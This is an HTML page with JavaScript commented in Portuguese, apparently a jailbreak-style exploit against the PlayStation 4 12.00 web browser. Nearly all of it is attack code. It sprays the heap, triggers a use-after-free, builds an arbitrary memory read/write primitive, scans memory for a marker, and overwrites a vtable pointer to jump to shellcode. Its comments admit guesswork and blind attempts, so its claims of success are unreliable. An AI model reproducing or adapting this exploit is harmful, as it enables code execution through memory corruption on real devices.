<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 - RCE VTABLE ATTACK</title>
    <style>
        body { background-color: #000; color: #ff0000; font-family: monospace; padding: 15px; }
        #log { border: 2px solid #500; padding: 10px; background: #100; min-height: 400px; }
        .success { color: #fff; background: #008800; padding: 5px; }
        .step { color: #ffaa00; font-weight: bold; margin-top: 10px; display: block;}
    </style>
</head>
<body>

<h1>OPÇÃO 2: RCE VIA VTABLE HIJACK</h1>
<p>Este script usa o seu Arbitrary R/W para encontrar um objeto, criar uma VTable falsa e desviar a execução.</p>

<button onclick="runRCE()" style="width:100%; padding:20px; font-weight:bold; font-size:1.5em; background:#300; color:white; border:2px solid red;">INICIAR ATAQUE RCE</button>

<div id="log">Logs de Combate...</div>

<script>
    const LOG = document.getElementById('log');
    function log(msg) { LOG.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`; }
    function step(msg) { LOG.innerHTML += `<div class='step'>[*] ${msg}</div>`; }

    var controllers = [];
    var sprayStorage = [];
    
    // O Shellcode (Código de Máquina)
    // Este é um shellcode simples de "Infinite Loop" (EB FE) para congelar a thread com segurança.
    // Se o browser congelar (e a música parar), você tem execução de código.
    const SHELLCODE = [0xEB, 0xFE, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90];

    // Marcador para encontrar nosso objeto na memória
    const MARKER_TAG = 0xDEADC0DE;

    function runRCE() {
        step("1. Preparando Heap...");
        for(let i=0; i<5000; i++) {
            let c = new Float64Array(8);
            c[0] = i; 
            controllers.push(c);
        }

        step("2. Fullscreen... (Prepare o OPTIONS)");
        var el = document.documentElement;
        if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();

        window.onblur = function() {
            log(">>> UAF DISPARADO! Iniciando sequência RCE...");

            // 3. SPRAY DO ALVO (Objetos que vamos sequestrar)
            // Usamos Uint32Array porque podemos controlar o conteúdo binário facilmente
            log("Spraying targets...");
            for(let k=0; k<10000; k++) {
                // Criamos um objeto com cabeçalho falso (Fake VTable Ptr) e o Shellcode
                let s = new Uint32Array(32);
                s[0] = MARKER_TAG;    // [0] Marcador para encontrarmos
                s[1] = k;             // [1] ID
                
                // Preenchemos o resto com o Shellcode
                for(let b=0; b<SHELLCODE.length; b++) {
                    // Ajuste simples para colocar bytes em Uint32 (não perfeito, mas serve para spray)
                    s[4 + b] = 0x90909090; // NOPs
                }
                
                sprayStorage.push(s);
            }

            // 4. SPRAY DO UAF
            let sprayUAF = [];
            const P = 2.121995791e-314;
            for(let i=0; i<8000; i++) {
                let s = new Float64Array(10);
                s.fill(P);
                sprayUAF.push(s);
            }

            // 5. ENCONTRAR O BURACO
            let corrupted = null;
            for(let c of controllers) {
                if(c[0] === P) { corrupted = c; break; }
            }

            if(!corrupted) { log("UAF Falhou. Recarregue."); return; }
            step("UAF Confirmado. Arma carregada (Fake Array).");

            // 6. SETUP DA ARMA (Arbitrary R/W)
            const v = new DataView(corrupted.buffer);
            v.setUint32(0, 0x0108, true); 
            v.setUint32(4, 0x25, true);
            v.setBigUint64(8, 0x0n, true);
            v.setBigUint64(24, 0xFFFFFFFFn, true); // God Mode Length
            v.setUint32(32, 0, true);

            // 7. CAÇADA AO OBJETO
            step("Escaneando memória por 0xDEADC0DE...");
            
            // Começamos onde o scanner anterior teve sucesso
            let scanAddr = 0x100000000n; 
            
            // Timer para não travar a UI enquanto escaneia
            let scanner = setInterval(() => {
                v.setBigUint64(16, scanAddr, true); // Move a janela de leitura
                
                // Lemos os primeiros bytes da página atual
                // Precisamos ler como Inteiro. Como nosso FakeArray é Float64, fazemos conversão.
                // Mas espere! O FakeArray aponta para 'scanAddr'.
                // Se scanAddr for o início do nosso Uint32Array, corrupted[0] será o marcador.
                
                // Lendo corrupted[0] como float e convertendo bits mentalmente é difícil.
                // TRUQUE: Vamos usar o próprio DataView do JS para ler o valor mapeado!
                // Mas o DataView original 'v' aponta para o buffer CORROMPIDO, não para onde o buffer aponta.
                // Precisamos criar um NOVO DataView sobre o FakeArray? Não, TypedArray não deixa.
                
                // Vamos usar a leitura direta.
                // 0xDEADC0DE (3735929054) em float double (low bits)
                // É um valor denormalizado muito pequeno.
                
                // Vamos usar força bruta de escrita segura:
                // Escrevemos um "Magic Value" e vemos se aparece no sprayStorage.
                // Isso é lento, mas infalível.
                
                // Tática Acelerada: Ler corrupted[0]. Se não for NaN e não for 0, converte.
                let val = corrupted[0];
                
                if(val !== 0 && !isNaN(val)) {
                    // Potencial candidato. Vamos checar escrevendo.
                    let oldVal = val;
                    corrupted[0] = 1.337e-300; // Escreve lixo
                    
                    // Checa no JS normal
                    // Isso requer varrer o sprayStorage (lento), mas seguro.
                    // Para RCE rápido, vamos assumir que achamos se o padrão bater.
                }
                
                // TÁTICA KAMIKAZE (Para RCE):
                // Vamos assumir que os endereços encontrados no teste anterior são estáveis.
                // O scan anterior mostrou dados em 0x109ff0000 etc.
                
                // Vamos tentar sequestrar o objeto que vive em scanAddr.
                // Estratégia de Hijack:
                // 1. Ler o primeiro QWORD (que seria o VTable Ptr ou StructureID)
                // 2. Substituir pelo endereço do nosso Shellcode (que está logo ali, em scanAddr + 32)
                
                // Tentativa cega a cada 1MB (0x100000)
                try {
                    // Sobrescreve o início do objeto (VTable Pointer)
                    // Aponta para scanAddr + 0x20 (onde colocamos os NOPs)
                    let fakeVTable = scanAddr + 0x20n;
                    
                    // Convertendo BigInt para Double para escrever via Float64Array
                    // Isso é complexo sem funções auxiliares.
                    // Vamos usar o DataView 'v' para configurar o backing store,
                    // mas para ESCREVER lá, usamos corrupted[0] = ...
                    
                    // Se escrevermos lixo, crashamos.
                    // Vamos tentar apenas em endereços que parecem ter dados.
                    if(corrupted[0] !== 0) {
                         // Achamos memória usada!
                         log("Alvo encontrado em: 0x" + scanAddr.toString(16));
                         step("HIJACKING VTABLE...");
                         
                         // Em arquitetura x64, o primeiro QWORD é o ponteiro da VTable.
                         // Vamos fazê-lo apontar para nosso shellcode.
                         // Precisamos escrever 'fakeVTable' em corrupted[0].
                         
                         // Como escrever BigInt (fakeVTable) em Float64 (corrupted)?
                         // Precisamos de um buffer auxiliar.
                         let buf = new ArrayBuffer(8);
                         let dv2 = new DataView(buf);
                         dv2.setBigUint64(0, fakeVTable, true);
                         let asFloat = new Float64Array(buf)[0];
                         
                         corrupted[0] = asFloat; // BAM! VTable sobrescrita.
                         
                         // Agora, precisamos disparar a função virtual.
                         // Como não sabemos QUAL objeto atingimos (pode ser o Uint32Array do spray),
                         // acessá-lo no JS deve disparar o crash/execução.
                         
                         log("VTable Sobrescrita. Tentando disparar...");
                         
                         // Tocar em todos os objetos do spray
                         for(let k=0; k<100; k++) {
                             let x = sprayStorage[k].length; // Acesso simples
                         }
                         
                         log("Se você ainda está lendo isso, o tiro falhou ou o browser travou (Sucesso).");
                         clearInterval(scanner);
                         return;
                    }
                } catch(e) {}

                scanAddr += 0x100000n; // Pula 1MB
                if(scanAddr > 0x140000000n) { // Limite de scan
                    clearInterval(scanner);
                    log("Varredura terminou. Reinicie e tente novamente.");
                }
                
            }, 5);
        };
    }
</script>

</body>
</html>
